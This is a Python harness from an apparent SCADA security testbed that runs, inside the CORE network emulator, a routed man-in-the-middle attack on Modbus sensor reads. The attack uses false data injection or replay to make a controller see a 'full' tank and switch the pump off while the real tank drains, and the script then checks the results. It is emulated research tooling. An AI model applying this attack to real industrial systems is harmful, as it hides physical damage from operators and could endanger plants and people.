#!/usr/bin/env python3
"""Live sensor-data attack on CORE (in-transit, L3-routed): FDI or replay.

Where the MITM command attack rewrote the actuator WRITE, this rewrites the
sensor READ response in transit, so the MTU/controller is fed FALSE measurements
and makes a harmful control decision on its own. The actuator command is NOT
tampered — the deception is entirely on the sensor path.

  * FDI (false data injection): force the tank-level read to a constant "safe"
    high value (6.0 > the pump-off threshold). The controller believes the tank
    is full, turns the pump OFF, and the real tank drains while the operator sees
    a healthy level.
  * REPLAY: record genuine level readings, then replay them so the MTU sees a
    plausible past signal while the plant diverges.

Reuses the stable L3-routed MITM (attacker = router between the MTU and PLC
subnets; no ARP) and the existing handlers (FDIHandler/ReplayHandler). EPANET,
the gateway, the scenario and the MTU's control logic are unchanged.

    SCADAVT_DIR=$PWD SCADAVT_NODE_PY=$PWD/.venv/bin/python \
        /opt/core/venv/bin/python tools/live_core_sensor_attack.py --kind fdi

Ground truth (true tank level) is read from the EPANET app over the Integration
API (off the attacked path); the MTU-perceived level is read over Modbus (through
the MITM). Their divergence is the attack; the real tank trajectory is the impact.
"""

from __future__ import annotations

import argparse
import csv
import json
import os
import sys
import tempfile
import time

REPO = os.environ.get("SCADAVT_DIR") or os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)

from tools.live_core_closed_loop import NODE_PY, PREFIX, launch, nrun, read_level  # noqa: E402
from tools.live_core_mitm import set_window  # noqa: E402
from core.api.grpc import client, wrappers  # noqa: E402
from core.api.grpc.wrappers import NodeType, Position  # noqa: E402
from scadavt.core import coregen  # noqa: E402

PASS, FAIL = [], []
FALSE_LEVEL = 6.0          # injected "full" reading (above the 5.5 pump-off threshold)


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    print(f"   [{'PASS' if cond else 'FAIL'}] {name}" + (f"  — {detail}" if detail else ""))
    return cond


def probe_level(core, sid, mtu, sess):
    """MTU-perceived tank level: a Modbus read of T1_LEV through the MITM path."""
    _, pr = nrun(core, sid, mtu, f'{PREFIX} && {NODE_PY} -m scadavt.core.probe '
                                 f'--session {sess} --node PLC1 --point T1_LEV')
    try:
        return float(pr.strip().split("=")[-1].split("@")[0])
    except Exception:
        return None


def probe_cmd(core, sid, mtu, sess):
    _, pr = nrun(core, sid, mtu, f'{PREFIX} && {NODE_PY} -m scadavt.core.probe '
                                 f'--session {sess} --node PLC1 --point P1_SPD')
    try:
        return float(pr.strip().split("=")[-1].split("@")[0])
    except Exception:
        return None


def sample(core, sid, appn, mtu, sess, n, dt=0.5):
    """(t, true level from EPANET app, perceived level over Modbus, pump command)."""
    rows, t0 = [], time.time()
    for _ in range(n):
        true = read_level(core, sid, appn, ("172.16.0.254", 9000), "T1_LEV")
        perc = probe_level(core, sid, mtu, sess)
        cmd = probe_cmd(core, sid, mtu, sess)
        rows.append((round(time.time() - t0, 2), true, perc, cmd))
        time.sleep(dt)
    return rows


def send_exceptions(core, sid, mtu):
    _, o = nrun(core, sid, mtu, "grep -c 'socket.send' /tmp/MTU.log || true")
    try:
        return int((o or "0").strip().split()[-1])
    except Exception:
        return -1


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--kind", default="fdi", choices=["fdi", "replay"])
    a = ap.parse_args()

    cfg = json.loads(open(os.path.join(REPO, "scadavt", "scenarios",
                                        "closed_loop_min", "lab_speed.json")).read())
    cfg["devices"][0]["ip"] = "10.0.2.10"
    cfg["devices"][0]["backchannel"] = "172.16.0.1:9161"
    outdir = tempfile.mkdtemp(prefix="scadavt_sensor_")
    coregen.write_session(cfg, outdir)
    os.chmod(outdir, 0o755)
    sess = os.path.join(outdir, "session.json")
    labpath = os.path.join(outdir, "lab.json")
    open(labpath, "w").write(json.dumps(cfg))
    evid = os.path.join(outdir, "evidence")
    os.makedirs(evid, exist_ok=True)
    ctl = "/tmp/sensor_ctl.json"
    set_window(ctl, False)

    if a.kind == "fdi":
        agent_args = (f"--kind fdi --func 4 --address 0 --mode const --value {FALSE_LEVEL}")
    else:
        agent_args = (f"--kind replay --func 4 --address 0 --window 200")

    core = client.CoreGrpcClient()
    core.connect()
    s = core.create_session()
    sid = s.id
    swa = s.add_node(1, name="SW_A", _type=NodeType.SWITCH, position=Position(x=150, y=120))
    swb = s.add_node(2, name="SW_B", _type=NodeType.SWITCH, position=Position(x=450, y=120))
    swm = s.add_node(3, name="SW_M", _type=NodeType.SWITCH, position=Position(x=450, y=380))
    mtu = s.add_node(4, name="MTU", _type=NodeType.DEFAULT, model="PC", position=Position(x=150, y=240))
    plc = s.add_node(5, name="PLC1", _type=NodeType.DEFAULT, model="PC", position=Position(x=450, y=240))
    atk = s.add_node(6, name="ATK", _type=NodeType.DEFAULT, model="router", position=Position(x=300, y=120))
    appn = s.add_node(7, name="APP", _type=NodeType.DEFAULT, model="PC", position=Position(x=600, y=380))
    s.add_link(node1=mtu, node2=swa, iface1=wrappers.Interface(0, ip4="10.0.1.10", ip4_mask=24), iface2=wrappers.Interface(0))
    s.add_link(node1=atk, node2=swa, iface1=wrappers.Interface(0, ip4="10.0.1.254", ip4_mask=24), iface2=wrappers.Interface(1))
    s.add_link(node1=plc, node2=swb, iface1=wrappers.Interface(0, ip4="10.0.2.10", ip4_mask=24), iface2=wrappers.Interface(0))
    s.add_link(node1=atk, node2=swb, iface1=wrappers.Interface(1, ip4="10.0.2.254", ip4_mask=24), iface2=wrappers.Interface(1))
    s.add_link(node1=plc, node2=swm, iface1=wrappers.Interface(1, ip4="172.16.0.1", ip4_mask=24), iface2=wrappers.Interface(0))
    s.add_link(node1=appn, node2=swm, iface1=wrappers.Interface(0, ip4="172.16.0.254", ip4_mask=24), iface2=wrappers.Interface(1))
    ok, warn = core.start_session(s)
    check(f"sensor-attack ({a.kind}) session started", ok, f"warnings={warn}")

    N = 220
    try:
        nrun(core, sid, atk, "sysctl -w net.ipv4.ip_forward=1")
        nrun(core, sid, mtu, "ip route replace default via 10.0.1.254")
        nrun(core, sid, plc, "ip route replace 10.0.1.0/24 via 10.0.2.254")
        launch(core, sid, plc, f"scadavt.core.device --session {sess} --node PLC1 "
                               f"--modbus 10.0.2.10:502 --io 0.0.0.0:9161", "PLC1")
        launch(core, sid, appn, f"scadavt.examples.app_runner --config {labpath} "
                                f"--listen 172.16.0.254:9000", "APP")
        launch(core, sid, appn, f"scadavt.core.gateway_run --session {sess} --app 172.16.0.254:9000 "
                                f"--step 120 --cycles {N} --sleep 0.1", "GW")
        time.sleep(3.0)
        launch(core, sid, atk, f"scadavt.attacks.mitm {agent_args} --victim-ip 10.0.2.10 --no-arp "
                               f"--modbus-port 502 --proxy-port 7502 --iface eth0 "
                               f"--control {ctl} --log /tmp/sensor.csv", "SENSOR")
        time.sleep(2.0)
        launch(core, sid, mtu, f"scadavt.core.master --session {sess} --node MTU --step 0.1 --cycles {N}", "MTU")
        time.sleep(3.0)

        # ---------------- BENIGN ----------------
        print(f"\n-- BENIGN (routed, {a.kind} handler recording/relaying, not falsifying) --")
        set_window(ctl, False)
        time.sleep(1.0)
        benign = sample(core, sid, appn, mtu, sess, 8)
        exc_before = send_exceptions(core, sid, mtu)

        # ---------------- ATTACK ----------------
        print(f"\n-- ATTACK (falsify the tank-level read: {a.kind}) --")
        set_window(ctl, True)
        time.sleep(1.5)
        attack = sample(core, sid, appn, mtu, sess, 12)
        set_window(ctl, False)
        exc_after = send_exceptions(core, sid, mtu)
        exc_during = exc_after - exc_before if (exc_after >= 0 and exc_before >= 0) else -1

        def col(rows, i):
            return [r[i] for r in rows if r[i] is not None]

        b_true, b_perc, b_cmd = col(benign, 1), col(benign, 2), col(benign, 3)
        a_true, a_perc, a_cmd = col(attack, 1), col(attack, 2), col(attack, 3)
        b_div = max((abs(t - p) for t, p in zip(b_true, b_perc)), default=0)
        a_div = max((abs(t - p) for t, p in zip(a_true, a_perc)), default=0)

        print("\n-- evidence --")
        print(f"   benign : true~{[round(x,2) for x in b_true[-4:]]} perceived~{[round(x,2) for x in b_perc[-4:]]} "
              f"pumpcmd~{[round(x,2) for x in b_cmd[-4:]]} max|true-perc|={b_div:.2f}")
        print(f"   attack : true~{[round(x,2) for x in a_true[-4:]]} perceived~{[round(x,2) for x in a_perc[-4:]]} "
              f"pumpcmd~{[round(x,2) for x in a_cmd[-4:]]} max|true-perc|={a_div:.2f}")
        print(f"   master socket.send exceptions during attack window: {exc_during}")

        # ---------------- classification ----------------
        check("connection stable (sensor deception, not disruption)",
              exc_during == 0, f"send_exc_during={exc_during}")
        # benign divergence is just read-timing skew between the app read and the
        # Modbus probe on a moving tank (sub-metre); the attack divergence is many metres
        check("benign: MTU-perceived level tracks the true level (sensor honest, only read lag)",
              b_div < 1.2, f"max|true-perceived|={b_div:.2f} (read-timing skew, not falsification)")
        if a.kind == "fdi":
            perc_high = bool(a_perc) and all(p > 5.0 for p in a_perc)
            cmd_off = bool(a_cmd) and (sum(c < 0.1 for c in a_cmd) / len(a_cmd)) > 0.6
            true_dropped = bool(a_true) and min(a_true) < (min(b_true) if b_true else 9) - 0.5
            check("FDI deception: MTU perceives a false HIGH level while the true level diverges",
                  perc_high and a_div > 2.0,
                  f"perceived~{round(a_perc[-1],2) if a_perc else None} true~{round(a_true[-1],2) if a_true else None} div={a_div:.2f}")
            check("controller deceived: it commands the pump OFF based on the false reading",
                  cmd_off, f"pumpcmd0frac={sum(c<0.1 for c in a_cmd)/max(1,len(a_cmd)):.2f}")
            check("physical impact: the REAL tank drains while the operator sees 'full'",
                  true_dropped, f"true min attack~{round(min(a_true),2) if a_true else None} "
                  f"vs benign min~{round(min(b_true),2) if b_true else None}")
        else:
            check("REPLAY deception: perceived level diverges from the true level during the window",
                  a_div > 1.0, f"max|true-perceived|={a_div:.2f} "
                  f"(perceived={[round(x,2) for x in a_perc[-4:]]})")

        for name, rows in [("benign_trace.csv", benign), ("attack_trace.csv", attack)]:
            with open(os.path.join(evid, name), "w", newline="") as fh:
                w = csv.writer(fh)
                w.writerow(["wall_s", "true_level", "perceived_level", "pump_cmd"])
                w.writerows(rows)
        import shutil
        for src, dst in [("/tmp/sensor.csv", "attacker_agent.csv"), ("/tmp/MTU.log", "commanded_mtu.log")]:
            try:
                shutil.copy(src, os.path.join(evid, dst))
            except Exception:
                pass
    finally:
        try:
            core.delete_session(sid)
        except Exception:
            pass

    print(f"\n  evidence: {evid}")
    print("=" * 60 + f"\n  RESULT ({a.kind})  PASSED: {len(PASS)}   FAILED: {len(FAIL)}")
    for f in FAIL:
        print(f"    FAIL -> {f}")
    return 0 if not FAIL else 1


if __name__ == "__main__":
    raise SystemExit(main())
